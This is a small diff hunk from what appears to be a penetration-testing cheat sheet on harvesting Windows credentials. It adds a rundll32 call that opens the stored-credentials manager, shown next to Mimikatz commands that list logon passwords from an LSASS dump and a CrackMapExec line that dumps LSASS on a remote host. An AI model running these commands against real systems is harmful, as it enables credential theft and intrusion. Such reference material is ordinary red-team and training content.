@@ -65,6 +65,11 @@ sekurlsa::minidump “XXXXXXXXX.DMP”
 sekurlsa::logonPasswords
 ```
 
+Native Windows command :
+```markdown
+rundll32 keymgr.dll, KRShowKeyMgr
+```
+
 CrackMapExec : Use the Mimikatz module
 ```markdown
 cme smb IP_ADDRESS -u 'Administrator' -p 'PASS' -M lsassy
